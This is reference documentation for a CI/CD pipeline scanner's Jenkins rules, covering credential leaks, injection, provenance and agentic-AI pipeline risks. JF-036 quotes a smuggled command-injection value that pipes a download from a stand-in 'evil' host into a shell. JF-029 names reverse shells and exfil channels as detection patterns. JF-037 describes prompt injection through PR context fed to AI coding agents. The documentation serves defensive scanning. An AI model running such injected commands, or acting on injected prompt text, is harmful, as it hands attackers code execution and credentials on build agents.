Remove ``wait: false`` and ``propagate: false`` from every ``build job:`` step, or replace them with an explicit ``currentBuild.result = build(...).result`` check. A fire-and-forget trigger can silently ship broken artifacts because the upstream job reports success regardless of what the downstream job actually did.

</div>

</div>

<div class="pg-rule pg-rule--low" markdown>

## JF-027: `archiveArtifacts` does not record a fingerprint { #jf-027 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--low">LOW</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-9</span> <span class="pg-tag pg-tag--esf">ESF-D-TAMPER</span> <span class="pg-tag pg-tag--cwe">CWE-345</span>
</div>

Fingerprinting hashes the artifact on archive so Jenkins can trace its flow between jobs, the same mechanism JF-013 relies on for verification-step pairing. It's cheap and retroactive: enabling it on the producer job unlocks a build-traceability audit for every downstream consumer.

<div class="pg-rule__rec" markdown>

**Recommended action**

Set ``fingerprint: true`` on every ``archiveArtifacts`` call (or use ``archiveArtifacts artifacts: '...', fingerprint: true``). Without it, Jenkins can't link the artifact to the build that produced it; ``copyArtifacts`` consumers downstream then have no provenance to verify against.

</div>

</div>

<div class="pg-rule pg-rule--medium" markdown>

## JF-028: No SLSA provenance attestation produced { #jf-028 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-9</span> <span class="pg-tag pg-tag--esf">ESF-S-PROVENANCE</span> <span class="pg-tag pg-tag--cwe">CWE-345</span>
</div>

``cosign sign`` signs the artifact bytes. ``cosign attest`` signs an in-toto statement describing how the build ran, builder, source commit, input parameters. SLSA L3 verifiers check the latter so consumers can enforce policy on where and how artifacts were produced.

<div class="pg-rule__rec" markdown>

**Recommended action**

Add a ``sh 'cosign attest --predicate=provenance.intoto.jsonl …'`` step after the build, or integrate the TestifySec ``witness run`` attestor. JF-006 covers signing; this rule covers the build-provenance statement SLSA Build L3 requires.

</div>

</div>

<div class="pg-rule pg-rule--critical" markdown>

## JF-029: Jenkinsfile contains indicators of malicious activity { #jf-029 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-4</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-7</span> <span class="pg-tag pg-tag--esf">ESF-D-INJECTION</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-506</span> <span class="pg-tag pg-tag--cwe">CWE-913</span>
</div>

Distinct from JF-016 (curl pipe) and JF-019 (Groovy sandbox escape). Those flag risky defaults; this flags concrete evidence, reverse shells, base64-decoded execution, miner binaries, exfil channels, credential-dump pipes, shell-history erasure. Runs on the comment-stripped Groovy text so ``// cosign verify … // webhook.site`` in a legitimate annotation doesn't false-positive.

**Known false-positive modes**

- Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

<div class="pg-rule__rec" markdown>

**Recommended action**

Treat as a potential compromise. Identify the commit that introduced the matching stage(s), rotate Jenkins credentials the job can reach, review controller/agent audit logs for outbound traffic to the matched hosts, and re-image the agent pool if the compromise may have persisted.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## JF-030: Dangerous shell idiom (eval, sh -c variable, backtick exec) { #jf-030 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-4</span> <span class="pg-tag pg-tag--esf">ESF-D-INJECTION</span> <span class="pg-tag pg-tag--cwe">CWE-95</span>
</div>

Complements JF-002 (script injection from untrusted build parameters). Fires on intrinsically risky shell idioms, ``eval``, ``sh -c "$X"``, backtick exec, regardless of whether the input source is currently trusted.

**Known false-positive modes**

- ``sh 'eval "$(ssh-agent -s)"'`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.

<div class="pg-rule__rec" markdown>

**Recommended action**

Replace ``eval "$VAR"`` / ``sh -c "$VAR"`` / backtick exec with direct command invocation. Validate any value feeding a dynamic command at the boundary, or pass arguments as a list to a real ``sh`` step so the shell is not re-invoked.

</div>

</div>

<div class="pg-rule pg-rule--medium" markdown>

## JF-031: Package install bypasses registry integrity (git / path / tarball source) { #jf-031 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-PIN-DEPS</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-829</span>
</div>

Complements JF-021 (missing lockfile flag). Git URL installs without a commit pin, local-path installs, and direct tarball URLs bypass the registry integrity controls the lockfile relies on.

<div class="pg-rule__rec" markdown>

**Recommended action**

Pin git dependencies to a commit SHA. Publish private packages to an internal registry (Artifactory, Nexus) instead of installing from a filesystem path or tarball URL.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## JF-032: Agent label interpolates attacker-controllable value { #jf-032 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix pg-fix--rule" title="`--fix` will patch this rule">🔧 autofix</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-7</span> <span class="pg-tag pg-tag--esf">ESF-D-BUILD-ENV</span> <span class="pg-tag pg-tag--esf">ESF-D-PRIV-BUILD</span> <span class="pg-tag pg-tag--cwe">CWE-345</span>
</div>

JF-014 catches agent labels that aren't ephemeral; this rule catches the upstream targeting choice. When ``label`` inside an ``agent { ... }`` block is computed from a build parameter or an SCM-controlled environment variable, whoever queues the build (or pushes the branch / opens the PR) picks which agent the job lands on, including any privileged label the controller exposes. Two attacker surfaces are flagged: untrusted ``env.*`` refs (``BRANCH_NAME``, ``CHANGE_BRANCH``, ``TAG_NAME``, …) and ``params.X`` references (caller-controlled at trigger time). The rule walks all four ``agent { ... }`` shapes, direct ``label``, the ``node { label … }`` form, and ``docker { label … }`` / ``dockerfile { label … }``, via brace-balanced scan so nested DSL blocks parse correctly.

**Known false-positive modes**

- Author-controlled environment refs like ``${env.JOB_NAME}`` or ``${env.BUILD_NUMBER}`` are intentionally not flagged, those values come from Jenkins itself, not from the triggerer. Pipelines that intentionally select agents via a vetted parameter and gate the assignment behind a Groovy validator should suppress with ``.pipelinecheckignore`` and a rationale rather than disable the rule everywhere.

<div class="pg-rule__rec" markdown>

**Recommended action**

Hard-code agent labels to a specific pool name. If label selection has to be parameterized, validate the candidate value against an explicit allowlist before the build starts (Groovy ``if`` guard at the top of the pipeline), and never inline ``${params.X}`` / ``${env.BRANCH_NAME}`` / ``${env.CHANGE_BRANCH}`` directly into ``label "..."``.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## JF-033: withCredentials secret leaked via Groovy ${...} interpolation in sh step { #jf-033 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-6</span> <span class="pg-tag pg-tag--esf">ESF-D-SECRETS</span> <span class="pg-tag pg-tag--cwe">CWE-532</span>
</div>

``withCredentials([string(credentialsId: 'X', variable: 'TOKEN')])`` exposes the secret as a shell environment variable for the duration of the block. The rule fires when a ``sh`` / ``bat`` / ``powershell`` step inside that block uses a Groovy interpolation (``${TOKEN}`` or ``$TOKEN`` in a double-quoted / triple-double-quoted string) to reference the binding. Groovy substitutes the literal value before handing the resulting string to the shell, so Jenkins' secret-masking wrapper, which only sees the shell-level ``$TOKEN`` token, cannot redact the value in trace output. Single-quoted bodies (``sh '... $TOKEN'``) leave the variable for the shell to resolve at run time, which is the safe pattern.

**Known false-positive modes**

- Bindings whose variable name doesn't look credential-ish (e.g. ``variable: 'COUNT'``) are still flagged: any value bound through ``withCredentials`` is a credential by definition.

<div class="pg-rule__rec" markdown>

**Recommended action**

Inside a ``withCredentials([...])`` block, reference each bound variable through the shell (single-quoted Groovy string), not through Groovy interpolation. Write ``sh 'curl -H "Authorization: Bearer $TOKEN" ...'`` instead of ``sh "curl -H 'Authorization: Bearer ${TOKEN}' ..."``. The single-quoted form keeps Jenkins' secret-masking layer in the loop, the double-quoted Groovy form bakes the literal value into the command string before the masker ever sees it, so ``set -x`` (Jenkins' default for ``sh``) prints the credential to the build log.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## JF-034: Pipeline declares a password() build parameter { #jf-034 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-6</span> <span class="pg-tag pg-tag--esf">ESF-D-SECRETS</span> <span class="pg-tag pg-tag--cwe">CWE-256</span>
</div>

Jenkins' ``password()`` parameter persists the supplied value into ``builds/<n>/build.xml`` as an encrypted ``Secret``, the same encryption the Credentials Provider uses. The encryption is keyed off the controller's master key at ``$JENKINS_HOME/secrets/master.key``, so anyone who captures both the build XML and the master key (a filesystem backup, an admin running ``thinBackup``, a compromised agent that can read controller state) recovers every password every operator has ever submitted. The build's parameters page renders the value as ``********`` for Job/Read users, but Job/Configure (or higher) can recover the encrypted string from ``config.xml`` and decrypt it. The substantive operational gap vs ``withCredentials`` is log-masking: a ``sh "deploy ${params.API_TOKEN}"`` step leaks the value to the build log because the Credentials Binding plugin's masker is what intercepts that flow, and the masker only fires for ``withCredentials`` bindings, not for ``params.*`` references. ``password()`` should be treated as a deprecated anti-pattern.

**Known false-positive modes**

- A pipeline that intentionally uses ``password()`` for a non-secret value (e.g. a one-off prompt for a confirmation token) is still flagged, the parameter type itself is the anti-pattern. Suppress via ``.pipelinecheckignore`` with a rationale rather than disabling the rule.

<div class="pg-rule__rec" markdown>

**Recommended action**

Replace ``password(name: 'X')`` with a credential binding. Store the secret in Jenkins' Credentials Provider and pull it in with ``withCredentials([string(credentialsId: 'X', variable: 'X')])``. The bound variable integrates with Jenkins' log-masking, the credential definition is decoupled from build invocation (so operators don't retype the value on every trigger), and Job/Configure on the build no longer exposes the value through ``build.xml``.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## JF-035: httpRequest step disables SSL verification { #jf-035 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-295</span>
</div>

The HTTP Request plugin's ``ignoreSslErrors: true`` flag tells the step to accept any TLS certificate (including self-signed, expired, hostname-mismatched, and attacker-presented) when calling the configured URL. Pipelines that hit internal services with broken trust chains frequently reach for it as a shortcut; the runtime consequence is that whatever the response body feeds into (``readJSON``, ``writeFile``, an arg to a subsequent deploy step) is now attacker-controllable for anyone who can MITM the controller-to-service connection. Complements JF-023 (which catches the broader catalog of curl/wget/git TLS bypasses) — JF-035 is specific to the ``httpRequest`` plugin step Jenkins pipelines commonly use for API calls.

<div class="pg-rule__rec" markdown>

**Recommended action**

Drop ``ignoreSslErrors: true`` from the ``httpRequest`` step. Fix certificate trust at the source: install the internal CA into the controller's truststore, or use a properly-issued certificate on the upstream service. Disabling verification on a CI runner lets any actor on the network path between Jenkins and the target inject responses, including payloads that flow into downstream stages.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## JF-036: Script step interpolates a build parameter (params.*) { #jf-036 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-4</span> <span class="pg-tag pg-tag--esf">ESF-D-INJECTION</span> <span class="pg-tag pg-tag--cwe">CWE-78</span>
</div>

A Jenkins build parameter is set by whoever queues the run: anyone with Build permission, an upstream `build job:` passing `parameters:`, or a webhook / remote trigger. A `string` parameter is free-form text. When Groovy interpolates it into a double-quoted shell body (`sh "deploy ${params.TARGET}"`) the value is substituted *before* the shell parses the line, so `params.TARGET = 'x; curl evil | sh'` runs the injected command on the agent in the build's full credential context. This is the Jenkins peer of the GHA `${{ inputs.X }}` and ADO `${{ parameters.X }}` injection rules. Only double-quoted / triple-double-quoted bodies are flagged; single-quoted Groovy strings (`sh '... $params ...'`) don't interpolate and are safe. JF-002 covers the SCM-env-var (`$BRANCH_NAME`) variant and JF-033 the `withCredentials` secret-leak variant; this rule is specifically the build-parameter source.

**Known false-positive modes**

- A parameter consumed purely as data inside a double-quoted body (`sh "echo ${params.NOTE}"`) is still flagged: the double quotes let `$(...)` / backticks in the value execute, so it is genuinely injectable, not a false positive.

<div class="pg-rule__rec" markdown>

**Recommended action**

Don't splice `${params.X}` into a double-quoted `sh` / `bat` / `powershell` body. Single-quote the Groovy string so it isn't interpolated, and let the shell read the value from the environment: `withEnv(["TAG=${params.TAG}"]) { sh 'build --tag "$TAG"' }`. The single-quoted form passes the value as one literal argument instead of letting it break out of the command.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## JF-037: Untrusted PR/build context reaches an agentic AI CLI (prompt injection) { #jf-037 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-4</span> <span class="pg-tag pg-tag--esf">ESF-D-INJECTION</span> <span class="pg-tag pg-tag--cwe">CWE-94</span> <span class="pg-tag pg-tag--cwe">CWE-77</span>
</div>

The AI analog of JF-002 (script injection). Fires when a ``sh`` / ``bat`` / ``powershell`` step invokes an agentic CLI (claude / gemini / cursor-agent / aider / openhands / goose / ``q chat``) AND attacker-controllable Jenkins context reaches it: an SCM-event env var (`$BRANCH_NAME` / `$CHANGE_TITLE` / `$CHANGE_BRANCH` / `$TAG_NAME` / `$GIT_*`) or a `${params.X}` build parameter. Unlike JF-002, both single- and double-quoted step bodies are flagged: an LLM ingests the value as prompt text regardless of Groovy quoting, so the JF-002 mitigation (single-quote the body) does not apply, which is why this is a separate rule.

<div class="pg-rule__rec" markdown>

**Recommended action**

Do not place attacker-controllable context (a PR's branch / tag / title, `$CHANGE_*`, or a `${params.X}` build parameter) in an agentic CLI's prompt. Groovy single-quoting does NOT sanitize a prompt the way it does a shell command, the model still reads the value. If the agent must see PR content, run it in a stage with no credentials bound and no tool / shell access, and treat its output as untrusted.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## JF-038: Agentic CLI output lands without human review { #jf-038 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-1</span> <span class="pg-tag pg-tag--esf">ESF-C-APPROVAL</span> <span class="pg-tag pg-tag--cwe">CWE-94</span> <span class="pg-tag pg-tag--cwe">CWE-693</span>
</div>

Fires when one Jenkinsfile both invokes an agentic CLI (``claude`` / ``gemini`` / ``cursor-agent`` / ``aider`` / ``openhands`` / ``goose`` / ``q chat``) in a ``sh`` / ``bat`` / ``powershell`` step and, in the same pipeline, lands the result with a ``git push`` (the Jenkins idiom for committing straight to a branch, since there are no ``uses:`` actions). Coupling is pipeline-level because the stages of one pipeline share a checkout.

Does NOT fire when the agent only opens a pull request for review, nor on a push step that does not run an agent (ordinary formatting / generated-file jobs). The agent-plus-push coupling is the signal. A ``git push --dry-run`` is ignored.

<div class="pg-rule__rec" markdown>

**Recommended action**

Don't let an agentic CLI's output reach a branch without a human review gate. Have the agent open a normal pull request (no auto-merge) so a person reviews the diff before it lands, and don't pair the agent with a ``git push`` straight to a branch in the same pipeline. If the agent's prompt can be influenced by untrusted input (a PR title / branch, a build parameter), treat the committed result as attacker-controlled.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## JF-039: ML model loaded with trust_remote_code (code execution) { #jf-039 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-4</span> <span class="pg-tag pg-tag--esf">ESF-D-INJECTION</span> <span class="pg-tag pg-tag--cwe">CWE-494</span> <span class="pg-tag pg-tag--cwe">CWE-829</span>
</div>

Fires on ``trust_remote_code=True`` / ``--trust-remote-code`` in a ``sh`` / ``bat`` / ``powershell`` step body (the shared ``model_trust`` detector, with GHA-120 / GL-045 / BB-035 / ADO-034 / HARNESS-010). Groovy quoting does not defang it: the loader runs the model repo's own Python regardless of how the command string is quoted, so both single- and double-quoted step bodies are flagged. The transformers / huggingface_hub loader executes that code at load time, so an untrusted or unpinned model is arbitrary code execution on the agent with the build's credentials in scope.

<div class="pg-rule__rec" markdown>

**Recommended action**

Load models with ``trust_remote_code=False`` (the library default). If a model genuinely needs custom code, vet it and pin an exact revision (a commit SHA, not a tag or branch), run the load in a stage with no production credentials bound, and prefer safetensors weights over pickle.

</div>

</div>

---

## Adding a new Jenkins check

1. Create a new module at
   `pipeline_check/core/checks/jenkins/rules/jfNNN_<name>.py`
   exporting a top-level `RULE = Rule(...)` and a `check(path, doc) -> Finding`
   function. The orchestrator auto-discovers `RULE` and calls `check`
   with the parsed YAML document.
2. Add a mapping for the new ID in
   `pipeline_check/core/standards/data/owasp_cicd_top_10.py` (and any
   other standard that applies).
3. Drop unsafe/safe snippets at
   `tests/fixtures/per_check/jenkins/JF-NNN.{unsafe,safe}.yml`
   and add a `CheckCase` entry in
   `tests/test_per_check_real_examples.py::CASES`.
4. Regenerate this doc:

   ```bash
   python scripts/gen_provider_docs.py jenkins
   ```
